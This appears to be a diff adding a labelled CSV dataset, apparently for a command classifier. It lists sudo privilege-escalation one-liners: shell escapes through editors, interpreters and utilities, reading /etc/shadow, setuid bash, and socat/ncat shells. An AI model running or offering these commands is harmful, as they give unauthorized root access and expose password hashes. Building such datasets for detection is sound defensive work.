@@ -1,0 +1,47 @@
+qualification,command
+0,sudo nmap --interactive
+0,sudo vim -c '!sh'
+0,"sudo awk 'BEGIN {system(""/bin/sh"")}'"
+0,sudo bash
+0,sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh
+0,"sudo python -c 'import os; os.system(""/bin/sh"")'"
+0,"sudo perl -e 'exec ""/bin/sh"";'"
+0,sudo find . -exec /bin/sh \;
+0,sudo less /etc/shadow
+00,sudo man -P /bin/sh man
+0,sudo ftp
+0,sudo env /bin/sh
+0,sudo gdb -ex '!sh' -q
+0,"sudo ruby -e 'exec ""/bin/sh""'"
+0,"sudo lua -e 'os.execute(""/bin/sh"")'"
+0,sudo more /etc/shadow
+0,"sudo socat tcp-connect:localhost:8080 exec:'/bin/sh',pty,stderr,setsid,sigint,sane"
+0,sudo tar -cf /dev/null /dev/null --checkpoint-action=exec=/bin/sh
+0,sudo tee /root/file.txt
+0,sudo vi -c ':!/bin/sh'
+0,sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+0,sudo zip myarchive.zip /etc/shadow -T -TT '/bin/sh'
+0,sudo base64 /dev/urandom > /dev/shm/outfile
+0,sudo xxd /etc/shadow
+0,sudo mysql -e 'system /bin/sh'
+0,"sudo tshark -i lo -z exec,/bin/sh"
+0,sudo git -p help config
+0,"sudo php -r 'system(""/bin/sh"");'"
+0,"sudo awk 'BEGIN {system(""/bin/bash"")}'"
+0,sudo nano /etc/shadow
+0,sudo chown root:root /bin/bash
+0,sudo chmod u+s /bin/bash
+0,sudo apt-get update && sudo apt-get install --reinstall sudo
+0,"sudo python3 -c 'import os; os.system(""/bin/sh"")'"
+0,sudo gcc exploit.c -o exploit && sudo ./exploit
+0,sudo rvim -c ':!/bin/bash'
+0,"sudo node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'"
+0,sudo ldd /bin/sh
+0,sudo rview -c ':!/bin/bash'
+0,sudo ncat -e /bin/sh localhost 8080
+0,sudo smbclient \\localhost\share -c '!/bin/sh'
+0,sudo bash -c 'exec /bin/sh'
+0,sudo less -f /etc/shadow
+0,sudo more -f /etc/shadow
+0,sudo csh -c 'exec /bin/sh'
+0,sudo expect -c 'spawn /bin/sh; interact'
